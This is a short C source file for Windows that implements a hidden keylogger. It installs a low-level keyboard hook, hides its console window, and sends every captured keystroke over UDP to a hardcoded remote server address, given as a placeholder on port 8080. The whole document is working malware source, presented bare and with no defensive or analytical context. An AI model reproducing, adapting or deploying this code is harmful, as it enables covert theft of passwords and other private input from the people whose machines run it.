#include <winsock2.h> #include <windows.h> #include <conio.h> #include <stdio.h> #include <stdlib.h> #include <time.h> #include <string.h> #define PORT 8080 #define SERVER "xxx.xxx.xxx.xxx" typedef struct { int n; HOOKPROC p; HHOOK h; } HKD; HKD kh; UINT m; BOOL C = TRUE; WSADATA wD; SOCKET S; SOCKADDR_IN R; int Rslt; LRESULT WINAPI rg(int, WPARAM, LPARAM); void gc(void); void fk(char *); void fs(WSADATA wD, SOCKET s, SOCKADDR_IN r, int rslt); int main(int a, char **b) { gc(); time_t n = time(NULL); MSG m; kh.n = WH_KEYBOARD_LL; kh.p = rg; kh.h = SetWindowsHookEx(kh.n, kh.p, (HINSTANCE)NULL, 0); if ((Rslt = WSAStartup(MAKEWORD(2, 2), &wD)) != 0) return 1; if ((S = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) { WSACleanup(); return 1; } R.sin_family = AF_INET; R.sin_port = htons(PORT); R.sin_addr.s_addr = inet_addr(SERVER); char *t = malloc(50); fk(t); free(t); while (GetMessage(&m, NULL, 0, 0) != 0) { TranslateMessage(&m); DispatchMessageW(&m); } if (kh.h) UnhookWindowsHookEx(kh.h); closesocket(S); WSACleanup(); return 1; } void fk(char *s) { int len = strlen(s); if ((Rslt = sendto(S, s, len + 1, 0, (SOCKADDR *)&R, sizeof(R))) == SOCKET_ERROR) { closesocket(S); WSACleanup(); return; } } LRESULT WINAPI rg(int c, WPARAM w, LPARAM l) { PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)l; char *b = malloc(12); memset(b, ' ', 12); if (c < 0) return CallNextHookEx(kh.h, c, w, l); if (c == HC_ACTION && w == WM_KEYDOWN) { m = MapVirtualKeyExW(key->vkCode, MAPVK_VK_TO_CHAR, GetKeyboardLayout(LANG_SYSTEM_DEFAULT)); switch (m) { case VK_RETURN: strcpy(b, "[ENTER]"); break; case VK_ESCAPE: strcpy(b, "[ESC]"); break; case VK_SPACE: strcpy(b, "[SPACE]"); break; case 0x51: PostQuitMessage(0); default: sprintf(b, "%c", m); } fk(b); } memset(b, 0, 12); free(b); return CallNextHookEx(kh.h, c, w, l); } void gc() { HWND w; AllocConsole(); w = FindWindowA("ConsoleWindowClass", NULL); ShowWindow(w, 0); }
